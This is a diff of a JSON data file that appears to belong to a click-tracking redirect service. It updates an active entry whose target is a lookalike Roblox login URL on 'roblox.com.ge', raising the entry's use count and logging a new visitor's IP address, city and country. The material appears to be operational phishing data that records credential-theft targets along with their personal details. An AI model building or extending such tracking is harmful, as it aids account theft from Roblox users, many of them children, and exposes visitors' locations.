@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1574,
+    "useCount": 1575,
     "createdBy": "admin",
     "clicks": [
       {
@@ -12760,6 +12760,14 @@
         "city": "Butuan",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777454807010,
+        "ip": "202.58.64.57",
+        "country": "Indonesia",
+        "city": "Wonogiri",
+        "flag": "🇮🇩",
+        "countryCode": "ID"
       }
     ]
   },
